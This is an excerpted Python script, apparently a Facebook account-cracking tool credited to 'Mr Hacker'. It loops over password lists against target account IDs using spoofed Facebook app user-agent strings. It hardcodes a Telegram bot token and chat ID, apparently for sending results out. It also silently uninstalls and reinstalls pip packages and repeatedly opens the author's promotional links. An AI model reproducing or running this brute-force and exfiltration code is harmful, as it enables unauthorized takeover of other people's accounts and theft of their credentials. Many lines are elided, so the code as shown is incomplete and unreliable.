# SOURCE BY : Mr Hacker  
# GitHub : https://github.com/Danger-imran
# Facebook : https://www.facebook.com/profile.php?id=61560931354830&mibextid=ZbWKwL
...
os.system('xdg-open https://t.me/we_are_haker')
os.system('xdg-open https://t.me/we_are_haker')
os.system('xdg-open https://t.me/we_are_haker')
os.system('xdg-open https://www.youtube.com/@MRDANGER-i')
os.system('xdg-open https://www.youtube.com/@MRDANGER-i')
os.system('xdg-open https://www.youtube.com/@MRDANGER-i')
os.system('xdg-open https://www.youtube.com/@MRDANGER-i')
try:
...
# Uninstall packages
packages_to_uninstall = ['requests', 'chardet', 'urllib3', 'idna', 'certifi']
for package in packages_to_uninstall:
    subprocess.call(['pip', 'uninstall', package, '-y'])

# Install packages
packages_to_install = ['chardet', 'urllib3', 'idna', 'certifi', 'requests']
subprocess.call(['pip', 'install'] + packages_to_install)
...
# Example of setting proxy in requests library (if you're using it)
# proxies = {
#     'http': f'http://{proxy}',
#     'https': f'https://{proxy}'
# }
...
def Elite(id,ps,coki):
    try:
        import requests
        token = "7381193562:AAGJPhYoPp4xHsqJIOTyJi-YmK2ZmZSlMmE"#Add yout token 
        chatid = "6251142250"#Add your Chat Id
...
logo=(f"""\033[1;37m
   ...
   (    ((_)\  /(_))(()/(    /(_)))((_) 
   )\  '  ((_)(_))_ Mr DANGER  /(_))_ (_)) ((_)_  
 _((_))  / _ \ |   \(_)) __||_ _| | _ ) 
| '  \()| (_) || |) | | (_ | | |  | _ \ 
|_|_|_|  \___/ |___/   \___||___| |___/ \033[1;32m(LOVE)
\033[1;37m═══════════════════════════════════════════════""")
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open-://www.youtube.com/@MRDANGER-i')
                                menu()
                        elif xd in ['5','05']:
                                os.system('xdg-open https://t.me/we_are_haker')
                                menu()
                        elif xd in ['6','06']:
                                os.system('xdg-open https://www.facebook.com/profile.php?id=61560931354830&mibextid=ZbWKwL')
                                menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use ♥ ')
                        else:
...
def M1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/173.0.0.87;FBBV/57981472;FBDM/{density=1.6,width=1780,height=4414};FBLC/en_US;FBRV/146593066;FBCR/4G;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Samsung SM-G965F;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/111.0.0.279;FBBV/182359665;FBDM/{density=1.5,width=2241,height=2168};FBLC/en_US;FBRV/846532544;FBCR/5G;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Samsung SM-G975F;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
